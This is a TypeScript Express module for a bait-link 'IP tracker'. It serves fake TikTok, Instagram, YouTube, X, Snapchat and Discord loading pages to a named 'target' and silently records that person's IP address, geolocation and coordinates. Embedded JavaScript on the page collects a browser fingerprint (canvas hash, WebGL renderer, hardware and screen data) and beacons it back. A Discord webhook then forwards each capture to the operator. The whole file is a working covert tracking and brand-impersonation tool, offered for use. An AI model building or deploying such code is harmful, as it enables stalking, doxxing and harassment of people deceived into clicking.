/**
 * GEASS INTELLIGENCE — IP TRACKER v2
 *
 * Camouflaged bait links that look like real social media content.
 * Renders a convincing loading page (TikTok / Instagram / YouTube / X / Snapchat / Discord)
 * before redirecting — captures IP the moment the bait URL is hit.
 *
 * Bait URL formats (all capture the same token):
 *   /tk/:token   → "TikTok video"
 *   /ig/:token   → "Instagram post"
 *   /yt/:token   → "YouTube video"
 *   /x/:token    → "X / Twitter post"
 *   /sc/:token   → "Snapchat story"
 *   /dc/:token   → "Discord invite"
 *   /v/:token    → legacy (plain redirect to discord.com)
 *
 * POST /api/tracker/gen   → { theme?, userId?, username?, targetName? } → { token, url, theme }
 * GET  /api/tracker/:token → full entry
 * GET  /api/tracker        → list all entries
 */
import { Router } from "express";
import fs from "node:fs";
import path from "node:path";
import { randomBytes } from "node:crypto";

// ── Theme definitions ──────────────────────────────────────────────────────
export type BaitTheme = "tiktok" | "instagram" | "youtube" | "x" | "snapchat" | "discord" | "plain";

interface ThemeConfig {
  route:       string;
  redirect:    string;
  bg:          string;  // background color
  accent:      string;  // spinner / primary color
  textColor:   string;
  loadingText: string;
  siteName:    string;
  favicon:     string;  // emoji used as favicon placeholder
  logo:        string;  // inline SVG or text logo
}

const THEMES: Record<BaitTheme, ThemeConfig> = {
  tiktok: {
    route:       "tk",
    redirect:    "https://www.tiktok.com/trending",
    bg:          "#010101",
    accent:      "#fe2c55",
    textColor:   "#ffffff",
    loadingText: "Opening TikTok video...",
    siteName:    "TikTok",
    favicon:     "🎵",
    logo: `<svg viewBox="0 0 48 48" width="64" height="64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M34 4h-6v26a6 6 0 1 1-6-6v-6a12 12 0 1 0 12 12V16a16 16 0 0 0 9 3v-6a10 10 0 0 1-9-9z" fill="#fe2c55"/>
      <path d="M31 4h-3v26a6 6 0 1 1-6-6v-3a12 12 0 1 0 12 12V16a16 16 0 0 0 6 1.2V11a10 10 0 0 1-9-7z" fill="#ffffff"/>
    </svg>`,
  },
  instagram: {
    route:       "ig",
    redirect:    "https://www.instagram.com/",
    bg:          "#000000",
    accent:      "#e1306c",
    textColor:   "#ffffff",
    loadingText: "Opening Instagram post...",
    siteName:    "Instagram",
    favicon:     "📷",
    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
      <defs><linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
        <stop offset="0%" style="stop-color:#f09433"/>
        <stop offset="25%" style="stop-color:#e6683c"/>
        <stop offset="50%" style="stop-color:#dc2743"/>
        <stop offset="75%" style="stop-color:#cc2366"/>
        <stop offset="100%" style="stop-color:#bc1888"/>
      </linearGradient></defs>
      <rect width="24" height="24" rx="6" fill="url(#ig)"/>
      <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
      <circle cx="12" cy="12" r="5" fill="none" stroke="white" stroke-width="1.5"/>
      <circle cx="18" cy="6" r="1.2" fill="white"/>
    </svg>`,
  },
  youtube: {
    route:       "yt",
    redirect:    "https://www.youtube.com/",
    bg:          "#0f0f0f",
    accent:      "#ff0000",
    textColor:   "#ffffff",
    loadingText: "Loading YouTube video...",
    siteName:    "YouTube",
    favicon:     "▶️",
    logo: `<svg viewBox="0 0 90 64" width="100" height="70" xmlns="http://www.w3.org/2000/svg">
      <rect width="90" height="64" rx="14" fill="#ff0000"/>
      <polygon points="36,16 68,32 36,48" fill="white"/>
    </svg>`,
  },
  x: {
    route:       "x",
    redirect:    "https://x.com/home",
    bg:          "#000000",
    accent:      "#ffffff",
    textColor:   "#ffffff",
    loadingText: "Opening post on X...",
    siteName:    "X",
    favicon:     "𝕏",
    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L2.25 2.25h6.963l4.259 5.632L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z" fill="white"/>
    </svg>`,
  },
  snapchat: {
    route:       "sc",
    redirect:    "https://www.snapchat.com/",
    bg:          "#fffc00",
    accent:      "#000000",
    textColor:   "#000000",
    loadingText: "Opening Snap...",
    siteName:    "Snapchat",
    favicon:     "👻",
    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C8.5 2 6 4.7 6 8.2v.8c-.5.2-.9.7-.9 1.2 0 .4.2.7.5.9-.4.9-1.1 1.5-2 1.9-.2.1-.3.3-.2.5.3.6 1.4.9 2.8 1.1l.1.4c.1.3.4.5.8.5h.2c.7.7 1.7 1.1 2.7 1.1 1 0 2-.4 2.7-1.1h.2c.4 0 .7-.2.8-.5l.1-.4c1.4-.2 2.5-.5 2.8-1.1.1-.2 0-.4-.2-.5-.9-.4-1.6-1-2-1.9.3-.2.5-.5.5-.9 0-.5-.4-1-.9-1.2v-.8C18 4.7 15.5 2 12 2z" fill="black"/>
    </svg>`,
  },
  discord: {
    route:       "dc",
    redirect:    "https://discord.com/app",
    bg:          "#313338",
    accent:      "#5865f2",
    textColor:   "#dbdee1",
    loadingText: "Joining server...",
    siteName:    "Discord",
    favicon:     "🎮",
    logo: `<svg viewBox="0 0 127.14 96.36" width="80" height="60" xmlns="http://www.w3.org/2000/svg">
      <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z" fill="#5865f2"/>
    </svg>`,
  },
  plain: {
    route:       "v",
    redirect:    "https://discord.com/app",
    bg:          "#1a1a2e",
    accent:      "#7289da",
    textColor:   "#ffffff",
    loadingText: "Loading...",
    siteName:    "Link",
    favicon:     "🔗",
    logo: "",
  },
};

const ALL_ROUTES = Object.values(THEMES).map(t => t.route);

// Build convincing HTML loading page for the given theme
// entry is used to embed the token and redirect URL into the page for client-side fingerprinting
function buildLoadingPage(theme: ThemeConfig, entry: TrackEntry): string {
  const redirectDest = entry.redirectUrl ?? theme.redirect;
  const token = entry.token;
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>${theme.siteName}</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:${theme.bg};color:${theme.textColor};font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
      display:flex;flex-direction:column;align-items:center;justify-content:center;
      min-height:100vh;gap:24px;user-select:none}
    .logo{opacity:.95}
    .spinner{width:40px;height:40px;border:3px solid rgba(128,128,128,.2);
      border-top-color:${theme.accent};border-radius:50%;animation:spin .8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .text{font-size:15px;opacity:.7;letter-spacing:.3px}
  </style>
</head>
<body>
  <div class="logo">${theme.logo}</div>
  <div class="spinner"></div>
  <div class="text">${theme.loadingText}</div>
  <script>
  (function(){
    var DEST = ${JSON.stringify(redirectDest)};
    var TOKEN = ${JSON.stringify(token)};
    var FP_URL = "/api/tracker/fp/" + TOKEN;

    function go(){ window.location.href = DEST; }

    // ── Canvas fingerprint (quick hash) ────────────────────────────────────
    function canvasHash(){
      try{
        var c=document.createElement("canvas");c.width=200;c.height=30;
        var ctx=c.getContext("2d");
        ctx.textBaseline="top";ctx.font="14px 'Arial'";
        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
        ctx.fillStyle="#069";ctx.fillText("Cwm fjordbank glyphs vext quiz 😀",2,15);
        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("Cwm fjordbank glyphs vext quiz 😀",4,17);
        var d=c.toDataURL();var h=0,i=0;
        for(;i<d.length;i++){h=(Math.imul(31,h)+d.charCodeAt(i))|0;}
        return(h>>>0).toString(16);
      }catch(e){return"err";}
    }

    // ── WebGL renderer ─────────────────────────────────────────────────────
    function webgl(){
      try{
        var c=document.createElement("canvas");
        var gl=c.getContext("webgl")||c.getContext("experimental-webgl");
        if(!gl)return{vendor:"n/a",renderer:"n/a"};
        var ext=gl.getExtension("WEBGL_debug_renderer_info");
        return{
          vendor:  ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):"n/a",
          renderer:ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):"n/a"
        };
      }catch(e){return{vendor:"err",renderer:"err"};}
    }

    // ── Collect & beacon ────────────────────────────────────────────────────
    function collect(){
      var nav=navigator,scr=screen;
      var conn=nav.connection||nav.mozConnection||nav.webkitConnection||null;
      var wgl=webgl();
      return{
        screenW:    scr.width,
        screenH:    scr.height,
        colorDepth: scr.colorDepth,
        pixelRatio: window.devicePixelRatio||1,
        lang:       nav.language,
        langs:      (nav.languages||[]).join(","),
        platform:   nav.platform,
        cores:      nav.hardwareConcurrency||null,
        memory:     nav.deviceMemory||null,
        connection: conn?conn.effectiveType:null,
        downlink:   conn?conn.downlink:null,
        rtt:        conn?conn.rtt:null,
        saveData:   conn?!!conn.saveData:null,
        tz:         Intl.DateTimeFormat().resolvedOptions().timeZone,
        online:     nav.onLine,
        cookies:    nav.cookieEnabled,
        dnt:        nav.doNotTrack,
        touchPoints:nav.maxTouchPoints||0,
        localTime:  new Date().toISOString(),
        canvasHash: canvasHash(),
        webglVendor:   wgl.vendor,
        webglRenderer: wgl.renderer
      };
    }

    // Send fingerprint then redirect — beacon first (fire-and-forget), then redirect
    function sendAndGo(){
      try{
        var data=JSON.stringify(collect());
        // Try sendBeacon first (non-blocking)
        var beaconed=false;
        if(navigator.sendBeacon){
          try{
            var b=new Blob([data],{type:"application/json"});
            beaconed=navigator.sendBeacon(FP_URL,b);
          }catch(e){}
        }
        if(!beaconed){
          // Fallback: fetch with keepalive
          try{
            fetch(FP_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:data,keepalive:true});
          }catch(e){}
        }
      }catch(e){}
      // Redirect after a brief delay regardless of beacon result
      setTimeout(go, 200);
    }

    // Redirect after 1.8s — collect fingerprint at ~1.5s so beacon fires before navigation
    setTimeout(sendAndGo, 1500);
    // Safety fallback
    setTimeout(go, 3500);
  })();
  </script>
</body>
</html>`;
}

// ── Discord capture webhook ────────────────────────────────────────────────────
// Set CAPTURE_WEBHOOK_URL env var to get instant Discord notifications on every IP capture
const CAPTURE_WEBHOOK_URL = process.env.CAPTURE_WEBHOOK_URL ?? "";

async function notifyCaptureWebhook(entry: TrackEntry): Promise<void> {
  if (!CAPTURE_WEBHOOK_URL) return;
  try {
    const FLAG_MAP: Record<string, string> = {
      US: "🇺🇸", BR: "🇧🇷", GB: "🇬🇧", DE: "🇩🇪", FR: "🇫🇷", RU: "🇷🇺", CN: "🇨🇳",
      IN: "🇮🇳", JP: "🇯🇵", KR: "🇰🇷", CA: "🇨🇦", AU: "🇦🇺", MX: "🇲🇽", AR: "🇦🇷",
      PT: "🇵🇹", ES: "🇪🇸", IT: "🇮🇹", NL: "🇳🇱", PL: "🇵🇱", TR: "🇹🇷",
    };
    const flag = (entry.countryCode && FLAG_MAP[entry.countryCode]) ? FLAG_MAP[entry.countryCode] : "🌐";
    const theme_labels: Record<string, string> = {
      tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
      x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord", plain: "🔗 Direto",
    };

    const embed = {
      title: "🎯 IP CAPTURADO — GEASS INTELLIGENCE",
      description: `*"O Geass vê tudo. Ninguém escapa do meu olho absoluto."*`,
      color: 0x9B59B6,
      fields: [
        { name: "🎭 Tema do Bait", value: theme_labels[entry.theme] ?? entry.theme, inline: true },
        { name: "🎯 Alvo", value: `\`${entry.targetName ?? "desconhecido"}\``, inline: true },
        { name: "📊 Hit #", value: `\`${entry.hits ?? 1}\``, inline: true },
        { name: "📡 IP Capturado", value: `\`${entry.capturedIp ?? "?"}\``, inline: true },
        { name: `${flag} Localização`, value: [entry.city, entry.region, entry.country].filter(Boolean).join(", ") || "N/A", inline: true },
        { name: "🏢 ISP", value: entry.isp ?? "N/A", inline: true },
        { name: "🔒 VPN/Proxy", value: entry.isProxy ? "✅ SIM" : "❌ Não", inline: true },
        { name: "📱 Mobile", value: entry.mobile ? "✅ Sim" : "❌ Não", inline: true },
        { name: "🕐 Fuso", value: entry.timezone ?? "N/A", inline: true },
        { name: "🗺️ Coords", value: (entry.lat && entry.lon) ? `[${entry.lat}, ${entry.lon}](https://maps.google.com/?q=${entry.lat},${entry.lon})` : "N/A", inline: true },
        { name: "🔑 Token", value: `\`${entry.token.slice(0, 12)}...\``, inline: true },
        { name: "📊 Ver resultado", value: `\`/panel ipcheck token:${entry.token}\``, inline: false },
      ],
      footer: { text: `Geass Intelligence Division • IP Tracker v2 — ${new Date().toISOString()}` },
      timestamp: new Date().toISOString(),
    };

    if (entry.userAgent) {
      embed.fields.push({ name: "🖥️ User-Agent", value: `\`\`\`${entry.userAgent.slice(0, 150)}\`\`\``, inline: false });
    }

    await fetch(CAPTURE_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Geass Intelligence", embeds: [embed] }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* non-fatal — webhook failure must never break the bait page */ }
}

// ── Store & persistence ──────────────────────────────────────────────────────
export interface TrackEntry {
  token:       string;
  theme:       BaitTheme;
  userId:      string;
  username:    string;
  targetName:  string;
  generatedAt: number;
  hits:        number;
  redirectUrl?: string;       // URL masking — real destination after capture
  // populated when first clicked (server-side)
  capturedIp?:  string;
  capturedAt?:  number;
  userAgent?:   string;
  country?:     string;
  countryCode?: string;
  region?:      string;
  city?:        string;
  isp?:         string;
  org?:         string;
  asn?:         string;
  timezone?:    string;
  lat?:         number;
  lon?:         number;
  isProxy?:     boolean;
  isVpn?:       boolean;
  isTor?:       boolean;
  isHosting?:   boolean;
  mobile?:      boolean;
  // populated by client-side fingerprint beacon
  fp_screenW?:     number;
  fp_screenH?:     number;
  fp_colorDepth?:  number;
  fp_pixelRatio?:  number;
  fp_lang?:        string;
  fp_langs?:       string;
  fp_platform?:    string;
  fp_cores?:       number;
  fp_memory?:      number;
  fp_connection?:  string;
  fp_downlink?:    number;
  fp_rtt?:         number;
  fp_saveData?:    boolean;
  fp_tz?:          string;
  fp_online?:      boolean;
  fp_cookies?:     boolean;
  fp_dnt?:         string;
  fp_touchPoints?: number;
  fp_localTime?:   string;
  fp_canvasHash?:  string;
  fp_webglVendor?: string;
  fp_webglRenderer?: string;
}

const STORE_PATH = path.join(process.cwd(), "data", "ip-tracker.json");
const store = new Map<string, TrackEntry>();

function loadStore(): void {
  try {
    const raw = fs.readFileSync(STORE_PATH, "utf8");
    const arr = JSON.parse(raw) as TrackEntry[];
    for (const e of arr) store.set(e.token, e);
    console.log(`[IP TRACKER] Loaded ${store.size} entries.`);
  } catch { /* no file yet */ }
}

function saveStore(): void {
  try {
    fs.mkdirSync(path.dirname(STORE_PATH), { recursive: true });
    fs.writeFileSync(STORE_PATH, JSON.stringify([...store.values()], null, 2));
  } catch { /* non-fatal */ }
}

loadStore();

// Purge entries older than 7 days every hour
setInterval(() => {
  const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
  for (const [token, entry] of store) {
    if (entry.generatedAt < cutoff) store.delete(token);
  }
  saveStore();
}, 60 * 60 * 1000);

export function generateTrackToken(
  userId: string, username: string, targetName: string,
  theme: BaitTheme = "tiktok", redirectUrl?: string,
): TrackEntry {
  const token = randomBytes(16).toString("hex");
  const entry: TrackEntry = {
    token, theme, userId, username, targetName,
    generatedAt: Date.now(),
    hits: 0,
    ...(redirectUrl ? { redirectUrl } : {}),
  };
  store.set(token, entry);
  // Keep latest 5 uncaptured per user
  const stale = [...store.values()]
    .filter(e => e.userId === userId && !e.capturedIp)
    .sort((a, b) => b.generatedAt - a.generatedAt)
    .slice(5);
  for (const e of stale) store.delete(e.token);
  saveStore();
  return entry;
}

export function getTrackEntry(token: string): TrackEntry | undefined {
  return store.get(token);
}

export function listAllEntries(): TrackEntry[] {
  return [...store.values()].sort((a, b) => b.generatedAt - a.generatedAt);
}

// ── Geolocation ──────────────────────────────────────────────────────────────
async function geolocate(ip: string): Promise<Partial<TrackEntry>> {
  try {
    const fields = "status,country,countryCode,region,city,isp,org,as,timezone,lat,lon,proxy,hosting,mobile";
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=${fields}`, {
      signal: AbortSignal.timeout(4000),
    });
    if (!res.ok) return {};
    const data = await res.json() as {
      status: string;
      country?: string; countryCode?: string; region?: string; city?: string;
      isp?: string; org?: string; as?: string; timezone?: string;
      lat?: number; lon?: number;
      proxy?: boolean; hosting?: boolean; mobile?: boolean;
    };
    if (data.status !== "success") return {};
    return {
      country:     data.country,
      countryCode: data.countryCode,
      region:      data.region,
      city:        data.city,
      isp:         data.isp,
      org:         data.org,
      asn:         data.as,
      timezone:    data.timezone,
      lat:         data.lat,
      lon:         data.lon,
      isProxy:     data.proxy,
      isVpn:       data.proxy,
      isHosting:   data.hosting,
      mobile:      data.mobile,
    };
  } catch {
    return {};
  }
}

// ── Shared bait handler — used for all themed routes ─────────────────────────
async function handleBaitRoute(
  req: import("express").Request,
  res: import("express").Response,
  themeKey: BaitTheme,
): Promise<void> {
  const token = req.params.token;
  const theme = THEMES[themeKey];
  const entry = store.get(token);

  // Always serve the loading page — captures IP immediately, redirects after 1.8s
  // Use a dummy entry for unknown tokens so the redirect still works
  const pageEntry: TrackEntry = entry ?? {
    token, theme: themeKey, userId: "", username: "", targetName: "",
    generatedAt: 0, hits: 0,
  };
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.send(buildLoadingPage(theme, pageEntry));

  if (!entry) return;

  // Increment hit counter
  entry.hits = (entry.hits ?? 0) + 1;

  // Extract real IP (handle CDN/proxy headers)
  const rawIp = (
    (req.headers["cf-connecting-ip"] as string) ||
    (req.headers["x-real-ip"] as string) ||
    (req.headers["x-forwarded-for"] as string)?.split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown"
  ).replace(/^::ffff:/, "");

  const ua = (req.headers["user-agent"] as string) ?? "unknown";

  if (!entry.capturedIp) {
    // First capture — geolocate async
    const geo = await geolocate(rawIp);
    entry.capturedIp = rawIp;
    entry.capturedAt = Date.now();
    entry.userAgent  = ua;
    Object.assign(entry, geo);
    console.log(`[IP TRACKER] 🎯 Captured ${rawIp} (${entry.country ?? "??"}) via ${themeKey} theme — token: ${token.slice(0, 8)}...`);
    // Fire Discord webhook notification (non-blocking)
    void notifyCaptureWebhook(entry);
  }

  saveStore();
}

// ── Bait router — mounted at ROOT "/" (no API key required) ─────────────────
// Keeps URLs looking like real social media links: /ig/:token, /tk/:token etc.
export const baitRouter = Router();

for (const [key, cfg] of Object.entries(THEMES) as [BaitTheme, ThemeConfig][]) {
  if (key === "plain") continue;
  baitRouter.get(`/${cfg.route}/:token`, (req, res) => {
    void handleBaitRoute(req, res, key);
  });
}
// Legacy plain route
baitRouter.get("/v/:token", (req, res) => {
  void handleBaitRoute(req, res, "plain");
});

// ── Client-side fingerprint beacon endpoint ───────────────────────────────────
// Called by the bait page JS with sendBeacon/fetch before redirecting
// No auth required — the token itself is the proof
baitRouter.post("/api/tracker/fp/:token", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Cache-Control", "no-store");
  const token = req.params.token;
  const entry = store.get(token);
  if (!entry) { res.status(204).end(); return; }

  const body = req.body as {
    screenW?: number; screenH?: number; colorDepth?: number; pixelRatio?: number;
    lang?: string; langs?: string; platform?: string;
    cores?: number; memory?: number;
    connection?: string; downlink?: number; rtt?: number; saveData?: boolean;
    tz?: string; online?: boolean; cookies?: boolean; dnt?: string;
    touchPoints?: number; localTime?: string;
    canvasHash?: string; webglVendor?: string; webglRenderer?: string;
  };

  entry.fp_screenW     = body.screenW;
  entry.fp_screenH     = body.screenH;
  entry.fp_colorDepth  = body.colorDepth;
  entry.fp_pixelRatio  = body.pixelRatio;
  entry.fp_lang        = body.lang;
  entry.fp_langs       = body.langs;
  entry.fp_platform    = body.platform;
  entry.fp_cores       = body.cores;
  entry.fp_memory      = body.memory;
  entry.fp_connection  = body.connection;
  entry.fp_downlink    = body.downlink;
  entry.fp_rtt         = body.rtt;
  entry.fp_saveData    = body.saveData;
  entry.fp_tz          = body.tz;
  entry.fp_online      = body.online;
  entry.fp_cookies     = body.cookies;
  entry.fp_dnt         = body.dnt;
  entry.fp_touchPoints = body.touchPoints;
  entry.fp_localTime   = body.localTime;
  entry.fp_canvasHash  = body.canvasHash;
  entry.fp_webglVendor   = body.webglVendor;
  entry.fp_webglRenderer = body.webglRenderer;

  saveStore();
  console.log(`[IP TRACKER] 🔬 Fingerprint recebido para token ${token.slice(0, 8)}... — ${body.screenW}x${body.screenH}, ${body.platform}, ${body.connection}`);
  res.status(204).end();
});

// ── API router — mounted at "/api" (through normal router chain) ─────────────
const router = Router();

// Generate a new tracking token with optional theme and redirect URL (URL masking)
router.post("/tracker/gen", (req, res) => {
  const { userId, username, targetName, theme, redirectUrl } = (req.body ?? {}) as {
    userId?: string; username?: string; targetName?: string;
    theme?: BaitTheme; redirectUrl?: string;
  };

  const selectedTheme: BaitTheme = (theme && theme in THEMES) ? theme : "tiktok";

  // Validate redirectUrl if provided
  let safeRedirectUrl: string | undefined;
  if (redirectUrl) {
    try {
      const u = new URL(redirectUrl);
      if (u.protocol === "https:" || u.protocol === "http:") safeRedirectUrl = redirectUrl;
    } catch { /* invalid URL — ignore */ }
  }

  const entry = generateTrackToken(
    userId      ?? "anonymous",
    username    ?? "unknown",
    targetName  ?? username ?? "target",
    selectedTheme,
    safeRedirectUrl,
  );

  const protocol = req.protocol ?? "http";
  const host = req.get("host") ?? "localhost";
  const themeRoute = THEMES[selectedTheme].route;
  const trackUrl = `${protocol}://${host}/${themeRoute}/${entry.token}`;

  res.json({
    token:       entry.token,
    url:         trackUrl,
    theme:       selectedTheme,
    generatedAt: entry.generatedAt,
    redirectUrl: safeRedirectUrl,
    themes:      ALL_ROUTES,
  });
});

// Get capture result for a token
router.get("/tracker/:token", (req, res) => {
  const entry = store.get(req.params.token);
  if (!entry) { res.status(404).json({ error: "token not found" }); return; }
  res.json(entry);
});

// List all entries
router.get("/tracker", (_req, res) => {
  res.json(listAllEntries().slice(0, 100));
});

export default router;
